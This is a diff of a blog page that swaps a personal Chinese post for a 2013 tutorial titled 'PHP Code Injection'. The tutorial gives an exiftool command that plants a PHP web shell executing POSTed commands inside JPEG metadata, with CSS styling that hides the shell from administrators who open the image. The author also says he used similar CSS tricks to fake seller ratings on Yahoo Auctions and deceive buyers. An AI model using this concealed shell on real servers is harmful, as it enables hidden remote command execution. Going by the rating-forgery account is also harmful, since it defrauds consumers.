@@ -6,11 +6,11 @@
 <!-- <head> -->
 <head xmlns:fb="http://ogp.me/ns/fb#">
   <meta charset="utf-8">
-  <title>The Future - atdog's Blog</title>
+  <title>PHP Code Injection - atdog's Blog</title>
   <meta name="author" content="atdog">
 
   
-  <meta name="description" content="只為了賺更多錢，而想出國； 只為了賺更多錢，而念研究所； 只為了賺更多錢，而選擇替代役。 而我的夢想呢？ 看到朋友正為了自己的未來而努力， 我卻好像因為找不到對未來衝刺的勇氣而感到無助。 回台北短短的二年內，台北的生活讓我把自己的耐心與努力磨光了， 面對這失望的社會體制， 取而代之的是， &hellip;">
+  <meta name="description" content="先前提到的 Exiftool 可以用來修改Image Metadata Tag的資料。 但當網頁加入 .htaccess AddHandler application/x-httpd-php .jpg 會導致讀取 http://target/image.jpg 以html/txt去讀取， &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -19,7 +19,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://blog.atdog.org/blog/2012/11/04/the-future/">
+  <link rel="canonical" href="http://blog.atdog.org/blog/2013/05/11/php-code-injection/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -81,7 +81,7 @@
   
   <header>
     
-      <h1 class="entry-title">The Future</h1>
+      <h1 class="entry-title">PHP Code Injection</h1>
     
     
       <p class="meta">
@@ -97,7 +97,7 @@
   
 
 
-<time datetime="2012-11-04T10:15:00+08:00" pubdate data-updated="true">Nov 4<span>th</span>, 2012</time>
+<time datetime="2013-05-11T10:50:00+08:00" pubdate data-updated="true">May 11<span>th</span>, 2013</time>
         
          | <a href="#disqus_thread">Comments</a>
         
@@ -106,61 +106,60 @@
   </header>
 
 
-<div class="entry-content"><p>只為了賺更多錢，而想出國；</p>
+<div class="entry-content"><p>先前提到的 <a href="/blog/2013/02/27/image-exif-tool/">Exiftool</a> 可以用來修改Image Metadata Tag的資料。</p>
 
+<p>但當網頁加入 .htaccess</p>
 
-<p>只為了賺更多錢，而念研究所；</p>
+<pre><code>AddHandler  application/x-httpd-php .jpg
+</code></pre>
 
+<p>會導致讀取 http://target/image.jpg 以html/txt去讀取，</p>
 
-<p>只為了賺更多錢，而選擇替代役。</p>
+<p>雖然因此能正確執行php，不過要是有其他使用者/管理者來檢查，</p>
 
+<p>發現讀取 http://target/image.jpg 都是亂碼，不就漏餡了嘛？</p>
 
-<p>而我的夢想呢？</p>
+<p>如圖</p>
 
-<br>
+<p><img src="/images/imageup1.png" title="image upload" alt="image upload" /></p>
 
+<p>所以就想了個trick來掩蓋這個問題，</p>
 
-<p>看到朋友正為了自己的未來而努力，</p>
+<p>透過html css，將亂碼字設成透明，並加入&lt;img&gt;tag來讓圖片「看起來」是正常的</p>
 
-<br>
+<pre><code>exiftool -DocumentName='&lt;?php if(!isset($_POST[cmd])) {echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";}else{passthru($_POST[cmd]);} __halt_compiler();?&gt;' apple.jpg
+</code></pre>
 
+<p>當中的PHP  code是這樣子的，</p>
 
-<p>我卻好像因為找不到對未來衝刺的勇氣而感到無助。</p>
+<pre><code>&lt;?php 
+    if(!isset($_POST[cmd])) {
+        echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;"
+        echo "&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";
+    }else{
+        passthru($_POST[cmd]);
+    } 
+    __halt_compiler();
+?&gt;
+</code></pre>
 
-<br>
+<p>若直接瀏覽圖片網址，如圖，會顯示出一個圖片</p>
 
+<p><img src="/images/phpinject1.png" title="phpinjectimage" alt="phpinject1" /></p>
 
-<p>回台北短短的二年內，台北的生活讓我把自己的耐心與努力磨光了，</p>
+<p>只有當 POST cmd=XX 到頁面上時，才會正確執行passthru($cmd)！</p>
 
-<br>
-
-
-<p>面對這失望的社會體制，</p>
-
-<br>
-
-
-<p>取而代之的是，對這社會制度影響下而扭曲的人們感到作嘔。</p>
-
-<br>
-
-
-<p>不過，若沒有真正去體驗，怎麼能看清這一切呢？</p>
-
-<br>
-
+<p><img src="/images/phpinject2.png" title="phpinjectimage" alt="phpinject2" /></p>
 
 <hr />
 
-<br>
+<p>其實這個想法就跟淘寶前陣子很多人在用的漏洞一樣，</p>
 
+<p>使用者可以自定義CSS，而導致透過CSS來假造賣家評價，來騙取使用者，</p>
 
-<p><a href="http://xman.tw">龍哥</a>，恭喜能去德國，在你夢想中的舞台發展，</p>
+<p>前陣子我和<a href="http://blog.dm4.tw">dm4</a> 在Yahoo 拍賣也透過一樣的手法，</p>
 
-<br>
-
-
-<p>像你說的，你一定能夠繼續影響這個世界。</p>
+<p>來做過評價的偽裝，雖然簡單但可以騙取到不少使用者的信任。</p>
 </div>
 
 
@@ -187,12 +186,12 @@
   
 
 
-<time datetime="2012-11-04T10:15:00+08:00" pubdate data-updated="true">Nov 4<span>th</span>, 2012</time>
+<time datetime="2013-05-11T10:50:00+08:00" pubdate data-updated="true">May 11<span>th</span>, 2013</time>
       
 
 <span class="categories">
   
-    <a class='category' href='/blog/categories/life/'>Life</a>
+    <a class='category' href='/blog/categories/security/'>Security</a>
   
 </span>
 
@@ -201,7 +200,7 @@
     
       <div class="sharing">
   
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.atdog.org/blog/2012/11/04/the-future/" data-via="h4ck47" data-counturl="http://blog.atdog.org/blog/2012/11/04/the-future/" >Tweet</a>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.atdog.org/blog/2013/05/11/php-code-injection/" data-via="h4ck47" data-counturl="http://blog.atdog.org/blog/2013/05/11/php-code-injection/" >Tweet</a>
   
   
   
@@ -212,10 +211,8 @@
     
     <p class="meta">
       
-        <a class="basic-alignment left" href="/blog/2012/07/28/everything-gonna-change/" title="Previous Post: 什麼都不一樣了">&laquo; 什麼都不一樣了</a>
+        <a class="basic-alignment left" href="/blog/2013/04/10/audio-conversion/" title="Previous Post: audio conversion">&laquo; audio conversion</a>
       
-      
-        <a class="basic-alignment right" href="/blog/2012/11/26/android-apps-exploit-poc/" title="Next Post: Android apps - Exploit poc">Android apps - Exploit poc &raquo;</a>
       
     </p>
   </footer>
@@ -298,10 +295,10 @@
       
         
         // var disqus_developer = 1;
-        // var disqus_identifier = 'http://blog.atdog.org/blog/2012/11/04/the-future/';
-        // var disqus_url = 'http://blog.atdog.org/blog/2012/11/04/the-future/';
-        var disqus_identifier = 'http://blog.atdog.org/blog/2012/11/04/the-future/';
-        var disqus_url = 'http://blog.atdog.org/blog/2012/11/04/the-future/';
+        // var disqus_identifier = 'http://blog.atdog.org/blog/2013/05/11/php-code-injection/';
+        // var disqus_url = 'http://blog.atdog.org/blog/2013/05/11/php-code-injection/';
+        var disqus_identifier = 'http://blog.atdog.org/blog/2013/05/11/php-code-injection/';
+        var disqus_url = 'http://blog.atdog.org/blog/2013/05/11/php-code-injection/';
         var disqus_script = 'embed.js';
       
     (function () {
